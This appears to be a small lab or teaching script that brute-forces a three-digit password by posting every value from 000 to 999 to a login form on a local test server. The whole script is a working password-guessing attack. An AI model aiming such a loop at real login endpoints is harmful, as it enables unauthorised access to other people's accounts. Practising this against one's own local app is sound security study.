import requests

url = "http://127.0.0.1:5000/"

print("Starting brute-force test...")
print("Trying passwords from 000 to 999\n")

for number in range(1000):

    password = f"{number:03d}"

    response = requests.post(
        url,
        data={"password": password}
    )

    if "Login successful!" in response.text:

        print("Password found!")
        print("Correct password:", password)

        break
else:
    print("Password was not found.")